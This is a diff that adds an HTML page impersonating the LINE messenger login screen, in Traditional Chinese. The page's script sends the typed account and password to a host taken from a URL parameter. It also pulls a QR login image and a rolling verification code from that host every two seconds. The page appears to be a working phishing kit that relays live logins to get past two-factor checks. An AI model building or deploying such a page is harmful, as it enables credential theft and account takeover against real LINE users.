@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/static/style.css">
+  <link rel="icon" href="/static/favicon.ico" type="image/x-icon" / >
+  <title>LINE登入頁面</title>
+</head>
+
+<body>
+  <form class="login"  id="loginForm"  method="post">
+    <h1 style="color: #2ecc71;font-size:50px;margin: 3% auto;">LINE</h1>
+    <input type="text" placeholder="帳號" name="ID">
+    <input type="password" placeholder="密碼" name="pad">
+    <body>
+      <button type="button" id="submitButton">提交</button>
+    <!-- <input type="submit" id="submitButton" value="登入"> -->
+    <hr class="hr1">
+    <h1 style="font-size:15px;margin: 0%;">使用行動條碼登入必須2分內登入</h1>
+    <!-- <img src="{{title}}"> -->
+    <img id="myImage" src="" alt="Image">
+    <hr class="hr1">
+    <h1 style="font-size:15px;margin: 0%;">驗證碼必須2分內輸入</h1>
+    <div class="box2" id = "c1">------</div>
+  </form>
+</body>
+<script>
+  const urlParams = new URLSearchParams(window.location.search);
+  const ip = "http://"+ urlParams.get("ip");
+  const SQ = urlParams.get("login");
+  document.addEventListener('DOMContentLoaded', function () {
+        var loginForm = document.getElementById('loginForm');
+        var submitButton = document.getElementById('submitButton');
+        submitButton.addEventListener('click', function () {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', ip + "/login/?"  +  "updata=" +SQ, true);
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                    //console.log('服務器回應:', xhr.responseText);
+                }
+            };
+            var formData = new FormData(loginForm);
+            xhr.send(formData);
+        });
+    });
+    function makeRequest() {
+        fetch(ip + "/login/?getpin=" +SQ)
+            .then(response => {
+                if (response.ok) {
+                    return response.text();
+                } else {
+                    throw new Error('Not Found');
+                }
+            })
+            .then(data => {
+                var timer = document.querySelector("#c1");
+                timer.innerText = data
+                setTimeout(makeRequest, 2000);
+            })
+            .catch(error => {
+                //console.error('請求錯誤:', error);
+                setTimeout(makeRequest, 2000);
+            });
+    }
+    const imageElement = document.getElementById('myImage');
+    imageElement.src = ip + "/login/?qr=" +SQ
+    makeRequest();
+</script>
+</html>
